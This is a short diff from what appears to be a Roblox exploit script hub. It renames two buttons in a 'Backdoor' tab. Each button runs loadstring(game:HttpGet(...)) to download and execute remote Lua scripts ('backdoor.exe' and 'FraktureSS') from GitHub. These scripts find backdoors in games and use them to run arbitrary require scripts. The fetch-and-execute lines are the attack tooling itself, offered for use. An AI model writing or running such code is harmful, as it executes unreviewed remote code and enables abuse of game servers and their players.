@@ -234,11 +234,11 @@ end)
 local Backdoor = Window:NewTab("Backdoor")
 local BackdoorSection = Backdoor:NewSection("Backdoor")
 
-BackdoorSection:NewButton("Backdoor Executer (OP)", "Check backdoors and lets u use require scripts. aka backdoor.exe", function()
+BackdoorSection:NewButton("Backdoor.exe", "Check backdoors and lets u use require scripts. aka backdoor.exe", function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
 end)
 
-BackdoorSection:NewButton("Backdoor Executer 2 (OP)", "Check backdoors and lets u use require scripts. aka FraktureSS", function()
+BackdoorSection:NewButton("FraktureSS", "Check backdoors and lets u use require scripts. aka FraktureSS", function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/unobfuscated.lua"))()
 end)
 
